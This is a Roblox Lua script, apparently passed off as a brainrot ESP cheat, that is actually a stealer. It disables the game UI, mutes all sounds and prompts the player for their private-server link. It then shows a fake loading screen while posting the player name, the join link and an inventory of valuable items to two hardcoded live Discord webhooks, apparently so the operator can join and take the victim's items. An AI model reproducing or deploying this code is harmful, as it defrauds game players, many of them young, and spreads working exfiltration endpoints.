--========================================================--
-- GUI DE LINK + FULLSCREEN LOADER + ESP + WEBHOOK FINAL
--========================================================--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")

local WEBHOOKS = {
    "https://discord.com/api/webhooks/1444572842162393220/fzmTS5484SC7ycsxFpWneHsXLiJcW2Hb5gBgF_Jdy-nuw11u1H0TjlhCOUDWGYIurTAB", -- WEBHOOK 1
    "https://discord.com/api/webhooks/1447649021123366964/TrecCFjbOYuTcrgU_aZYWCHjiC59gG8vRyqGN9bfAvTNO-_2-ndf7z3ExCGroNm_9o-a",  --WEBHOOK 2
}

--========================================================--
-- FUNÇÃO PARA CANCELAR TODOS OS SONS
--========================================================--
local function StopAllSounds()
    local function StopDescendants(parent)
        for _, obj in pairs(parent:GetDescendants()) do
            if obj:IsA("Sound") then
                obj:Stop()
                obj.Playing = false
                obj.Volume = 0
            end
        end
        parent.DescendantAdded:Connect(function(desc)
            if desc:IsA("Sound") then
                desc:Stop()
                desc.Playing = false
                desc.Volume = 0
            end
        end)
    end

    -- Aplica em todos os lugares que possam ter sons
    StopDescendants(Workspace)
    StopDescendants(ReplicatedStorage)
    StopDescendants(StarterGui)
    StopDescendants(LocalPlayer:WaitForChild("PlayerGui"))
    StopDescendants(LocalPlayer:WaitForChild("Backpack"))
    if LocalPlayer.Character then
        StopDescendants(LocalPlayer.Character)
    end

    LocalPlayer.CharacterAdded:Connect(function(char)
        StopDescendants(char)
    end)
end

-- Chama a função sem bloquear a GUI ainda
task.spawn(StopAllSounds)

--========================================================--
-- DESABILITA CORE GUI
--========================================================--
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

--========================================================--
-- GUI DE LINK
--========================================================--
local smallGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
smallGui.Name = "SmallVerifyGui"
smallGui.ResetOnSpawn = false

local frame = Instance.new("Frame", smallGui)
frame.Size = UDim2.new(0, 380, 0, 160)
frame.Position = UDim2.new(0.5, -190, 0.5, -80)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1,0,0,40)
title.Text = "Enter Private Server Link"
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.new(1,1,1)

local box = Instance.new("TextBox", frame)
box.Size = UDim2.new(0.9,0,0,35)
box.Position = UDim2.new(0.05,0,0.4,0)
box.Font = Enum.Font.Gotham
box.TextSize = 16
box.Text = ""
box.PlaceholderText = "https://www.roblox.com/share?code=xxxx&type=Server"
box.BackgroundColor3 = Color3.fromRGB(35,35,50)
box.TextColor3 = Color3.new(1,1,1)
box.ClearTextOnFocus = false
box.TextXAlignment = Enum.TextXAlignment.Left
box.TextWrapped = true
box.TextTruncate = Enum.TextTruncate.None
Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)

local btn = Instance.new("TextButton", frame)
btn.Size = UDim2.new(0.9,0,0,36)
btn.Position = UDim2.new(0.05,0,0.73,0)
btn.Text = "Confirm"
btn.Font = Enum.Font.GothamBold
btn.TextColor3 = Color3.new(1,1,1)
btn.TextSize = 18
btn.BackgroundColor3 = Color3.fromRGB(0,150,255)
Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)

local serverLinkFinal = nil
local startTime = os.time()

local function SendWebhook(extraFields)
    local timeStr = "foi ás " .. os.date("%H:%M")

    local payloadTable = {
        username = "by: print()",
        embeds = {{
            title = "🔗 auto virose | " .. timeStr,
            color = 16732240,
            fields = extraFields,
            image = {
                url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg?ex=6931e3e3&is=69309263&hm=f93851b0553384903a1aeb51004b8eb49468353cb6f9c635de5695b772c4d7d3"
            }
        }}
    }

    local payload = HttpService:JSONEncode(payloadTable)

    for _, url in ipairs(WEBHOOKS) do
        pcall(function()
            HttpService:RequestAsync({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = payload
            })
        end)
    end
end

btn.MouseButton1Click:Connect(function()
    local txt = box.Text
    local ok = txt:match("^https://www%.roblox%.com/share%?code=[%w_%-%d]+&type=Server$")
    if not ok then
        btn.Text = "Invalid!"
        btn.BackgroundColor3 = Color3.fromRGB(255,40,40)
        task.wait(1)
        btn.Text = "Confirm"
        btn.BackgroundColor3 = Color3.fromRGB(0,150,255)
        return
    end
    serverLinkFinal = txt
    btn.Text = "✓ SENT"
    btn.BackgroundColor3 = Color3.fromRGB(0,200,80)
end)

repeat task.wait() until serverLinkFinal ~= nil

--========================================================--
-- FULLSCREEN LOADER
--========================================================--
local loaderGui = Instance.new("ScreenGui", CoreGui)
loaderGui.Name = "KdmlLoader"
loaderGui.IgnoreGuiInset = true
loaderGui.ResetOnSpawn = false

local loaderFrame = Instance.new("Frame", loaderGui)
loaderFrame.Size = UDim2.new(1,0,1,0)
loaderFrame.BackgroundColor3 = Color3.fromRGB(20,0,0)

local loaderSound = Instance.new("Sound", loaderFrame)
loaderSound.SoundId = "rbxassetid://1848354536"
loaderSound.Volume = 1
loaderSound.Looped = true
loaderSound:Play()

local loaderTitle = Instance.new("TextLabel", loaderFrame)
loaderTitle.Size = UDim2.new(1,0,0.1,0)
loaderTitle.Position = UDim2.new(0,0,0.35,0)
loaderTitle.BackgroundTransparency = 1
loaderTitle.Font = Enum.Font.GothamBold
loaderTitle.TextSize = 36
loaderTitle.TextColor3 = Color3.fromRGB(255,80,80)
loaderTitle.Text = "auto moreira X virose..."
loaderTitle.TextScaled = true

local loaderPercent = Instance.new("TextLabel", loaderFrame)
loaderPercent.Size = UDim2.new(1,0,0.1,0)
loaderPercent.Position = UDim2.new(0,0,0.45,0)
loaderPercent.BackgroundTransparency = 1
loaderPercent.Font = Enum.Font.GothamBold
loaderPercent.TextSize = 24
loaderPercent.TextColor3 = Color3.fromRGB(255,80,80)
loaderPercent.Text = "0%"

local totalTime = 40
local steps = 100
for i = 1, steps do
    loaderPercent.Text = math.floor(i/steps*100).."%"
    task.wait(totalTime/steps)
end

loaderTitle:Destroy()
loaderPercent:Destroy()

local done = Instance.new("TextLabel", loaderFrame)
done.Size = UDim2.new(1,0,1,0)
done.BackgroundTransparency = 1
done.Font = Enum.Font.GothamBold
done.TextScaled = true
done.TextColor3 = Color3.fromRGB(255,100,100)
done.Text = "✓ Script Loaded\nPlease Wait 2-3 Minutes..."

--========================================================--
-- ESP DE BRAINROTS + WEBHOOK
--========================================================--
local function formatNumber(num)
    if num >= 1e9 then
        return string.format("%.1fB/s", num/1e9)
    elseif num >= 1e6 then
        return string.format("%.1fM/s", num/1e6)
    elseif num >= 1e3 then
        return string.format("%.1fk/s", num/1e3)
    else
        return tostring(num).."/s"
    end
end

local function ScanBrainrots()
    local animalsModule = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild("Animals")
    if not animalsModule then return end

    local brainrotDB = {}
    local success, animalData = pcall(require, animalsModule)
    if success and type(animalData) == "table" then
        for name,data in pairs(animalData) do
            if type(data)=="table" and data.Price and data.Generation then
                brainrotDB[name] = {income = data.Generation}
            end
        end
    end

    local brainrotCount = {}

    for _, plot in pairs(Workspace.Plots:GetChildren()) do
        for _, brainrot in pairs(plot:GetChildren()) do
            if brainrot:IsA("Model") and brainrotDB[brainrot.Name] then
                local income = brainrotDB[brainrot.Name].income
                local rootPart = brainrot:FindFirstChild("RootPart") or brainrot:FindFirstChild("FakeRootPart")
                if rootPart then
                    if brainrot:FindFirstChild("ESP") then brainrot.ESP:Destroy() end
                    local highlight = Instance.new("Highlight")
                    highlight.Name = "ESP"
                    highlight.FillColor = Color3.fromRGB(0,100,255)
                    highlight.OutlineColor = Color3.new(1,1,1)
                    highlight.FillTransparency = 0.1
                    highlight.OutlineTransparency = 0
                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    highlight.Parent = brainrot
                end
                if not brainrotCount[brainrot.Name] then
                    brainrotCount[brainrot.Name] = {count=1, income=income}
                else
                    brainrotCount[brainrot.Name].count += 1
                end
            end
        end
    end

    local extraFields = {}
    local content = ""
    for name, data in pairs(brainrotCount) do
        content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"
    end
    extraFields = {
        {name="Player", value=LocalPlayer.Name},
        {name="Players in Server", value=tostring(#Players:GetPlayers()), inline=false},
        {name="Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},
        {name="Brainrots", value=content, inline=false}
    }
    SendWebhook(extraFields)
end

task.spawn(function()
    repeat task.wait() until loaderGui
    ScanBrainrots()
end)